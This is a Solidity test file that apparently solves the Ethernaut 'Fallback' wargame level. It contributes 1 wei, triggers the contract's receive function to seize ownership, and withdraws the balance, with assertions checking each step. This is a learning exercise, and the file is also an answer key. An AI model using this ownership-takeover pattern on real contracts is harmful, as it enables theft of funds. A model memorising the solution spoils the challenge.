pragma solidity 0.8.20;

import "./Fallback.sol";
import "../Attack.sol";

contract FallbackAttack is Attack {
  Fallback private _fallback;

  function setUp() public {
    vm.prank(owner);
    _fallback = new Fallback();
  }

  function test_attack() public {
    vm.startPrank(attacker);

    /*** STEP #1 - Contribute a small value ***/

    _fallback.contribute{value: 1}();

    // We should have contributed 1 wei
    assertEq(_fallback.contributions(attacker), 1);

    // The owner shouldn't change
    assertEq(_fallback.owner(), owner);

    /*** STEP #2 - Send a small value, calling the contract's `receive` fallback function ***/

    (bool success, bytes memory result) = payable(_fallback).call{value: 1}("");
    require(success, string(result));

    // We should now be the owner
    assertEq(_fallback.owner(), attacker);

    /*** STEP #3 - Withdraw the contract's balance ***/
    _fallback.withdraw();

    /*** Validation ***/
    assertFinished(address(_fallback));
  }

  function validateInstance(address payable _instance, address _player) override public view returns (bool) {
    Fallback instance = Fallback(_instance);
    return instance.owner() == _player && address(instance).balance == 0;
  }
}
